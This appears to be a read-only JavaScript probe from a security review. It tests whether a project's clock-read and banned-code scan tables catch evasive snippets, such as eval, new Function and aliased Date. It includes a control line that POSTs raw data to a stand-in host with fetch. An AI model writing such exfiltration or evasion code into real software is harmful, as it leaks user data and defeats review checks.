// Security re-check of SEC-03: runs HEAD's two scan tables, read from tests/purity.test.js itself, against
// one-line snippets of clock reads the tables may miss, and against the egress mirror with fetch alone.
// Read-only: the test file is parsed, never changed or imported.
import { readFileSync, writeFileSync } from "node:fs";

const root = new URL("../../../../../../", import.meta.url);
const testText = readFileSync(new URL("tests/purity.test.js", root), "utf8");
const table = (name) => {
  const start = testText.indexOf(`const ${name} = {`);
  const end = testText.indexOf("};", start);
  return Function(`return ${testText.slice(testText.indexOf("{", start), end + 1)}`)();
};
const CLOCK_AND_RANDOM_READS = table("CLOCK_AND_RANDOM_READS");
const BANNED_IN_CODE = table("BANNED_IN_CODE");
const withoutComments = (text) => text.replace(/\/\*[\s\S]*?\*\//g, "").replace(/\/\/.*$/gm, "");
const hits = (code) => [
  ...Object.entries(CLOCK_AND_RANDOM_READS).filter(([, p]) => p.test(code)).map(([n]) => `clock: ${n}`),
  ...Object.entries(BANNED_IN_CODE).filter(([, p]) => p.test(withoutComments(code))).map(([n]) => `banned: ${n}`),
];

const lines = [`tables read from HEAD tests/purity.test.js: ${Object.keys(CLOCK_AND_RANDOM_READS).length} clock patterns, ${Object.keys(BANNED_IN_CODE).length} banned groups`];
lines.push(`node ${process.version}: typeof Temporal = ${typeof globalThis.Temporal}`);
const snippets = {
  "Temporal.Now.plainDateISO()": "const today = Temporal.Now.plainDateISO().toString();",
  "Temporal.Now.instant()": "const now = Temporal.Now.instant();",
  "Temporal.PlainDate.from(key).add({ days: 1 }) (no clock read)": "const next = Temporal.PlainDate.from(key).add({ days: 1 });",
  "Reflect.construct(Date, [])": "const now = Reflect.construct(Date, []);",
  "aliased constructor": "const Clock = Date; const now = new Clock();",
  "new (Date)()": "const now = new (Date)();",
  "eval": 'const now = eval("new " + "Da" + "te");',
  "new Function": 'const read = new Function("return Da" + "te.now()");',
  "control: new Date;": "const now = new Date;",
  "control: fetch alone": 'fetch("https://collector.invalid/", { method: "POST", body: raw });',
};
for (const [label, code] of Object.entries(snippets)) {
  const found = hits(code);
  lines.push(`${label}: ${found.length ? found.join("; ") : "NOT CAUGHT"}`);
}
const egress = readFileSync(new URL("./mirrors/egress-fetch-and-sessionStorage/src/habits.js", import.meta.url), "utf8")
  .split("\n").filter((line) => !line.includes("sessionStorage")).join("\n");
lines.push(`egress mirror with the sessionStorage line removed: ${hits(egress).join("; ") || "NOT CAUGHT"}`);
lines.push(`HEAD src/habits.js: ${hits(readFileSync(new URL("src/habits.js", root), "utf8")).join("; ") || "no hit"}; HEAD src/dates.js: ${hits(readFileSync(new URL("src/dates.js", root), "utf8")).join("; ") || "no hit"}`);

const text = lines.join("\n") + "\n";
writeFileSync(new URL("./probe-scan-hunt.txt", import.meta.url), text);
process.stdout.write(text);
